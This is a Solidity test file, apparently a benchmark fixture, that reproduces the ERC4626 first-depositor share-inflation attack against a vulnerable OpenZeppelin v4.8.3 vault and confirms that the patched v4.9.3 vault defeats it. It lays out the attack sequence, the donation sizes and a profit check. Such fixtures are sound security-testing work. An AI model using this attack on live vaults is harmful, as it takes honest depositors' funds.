// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
import "../src/IVault.sol";
import "../src/harness/MintableERC20.sol";
import "../src/harness/Attacker.sol";

// Deploy the two vault versions by artifact name so this test does NOT import either OZ tree — keeping
// v4.8 and v4.9 (same-named `Math`/`SafeERC20` libraries) in separate compilation units.
interface IVm { function deployCode(string calldata, bytes calldata) external returns (address); }

/// Milestone-1 fixture for evm.first-depositor-share-inflation (ADR 0008). REAL OpenZeppelin ERC4626 at
/// v4.8.3 (vuln, pre-mitigation) vs v4.9.3 (patched, virtual shares) — a canonical before/after. Gate:
/// the vuln vault lets the attacker profit while diluting the honest depositor to zero shares; the
/// patched vault makes the attack unprofitable and keeps the honest depositor whole (patched-control).
contract Erc4626FirstDepositorTest {
    IVm constant vm = IVm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    uint256 internal constant DONATION = 10_000e18;
    uint256 internal constant HONEST   = 5_000e18;
    event R(string tag, int256 attackerPnl, uint256 honestShares);

    function _run(bool patched) internal returns (int256 pnl, uint256 honestShares) {
        MintableERC20 asset = new MintableERC20();
        address vault = vm.deployCode(
            patched ? "VaultPatched.sol:VaultPatched" : "VaultVuln.sol:VaultVuln",
            abi.encode(address(asset))
        );
        Attacker atk = new Attacker(vault, address(asset));
        uint256 spend = 1 + DONATION;
        asset.mint(address(atk), spend);
        atk.attackSetup(DONATION);

        asset.mint(address(this), HONEST);
        asset.approve(vault, type(uint256).max);
        IVault(vault).deposit(HONEST, address(this));
        honestShares = IVault(vault).balanceOf(address(this));

        uint256 got = atk.cashOut();
        pnl = int256(got) - int256(spend);
    }

    /// VULNERABLE: attacker profits, honest depositor diluted to 0 shares — invariant break.
    function test_vuln_first_depositor_inflation() external {
        (int256 pnl, uint256 honestShares) = _run(false);
        emit R("VULN", pnl, honestShares);
        require(pnl > 0, "VULN: attacker should net a profit from the inflation");
        require(honestShares == 0, "VULN: honest depositor should be diluted to 0 shares");
    }

    /// PATCHED (v4.9 virtual shares): attack unprofitable, honest keeps non-zero shares — patched-control.
    function test_patched_virtual_shares_patched_control() external {
        (int256 pnl, uint256 honestShares) = _run(true);
        emit R("PATCHED", pnl, honestShares);
        require(pnl <= 0, "PATCHED: attacker must NOT profit from the inflation (patched-control)");
    }
}
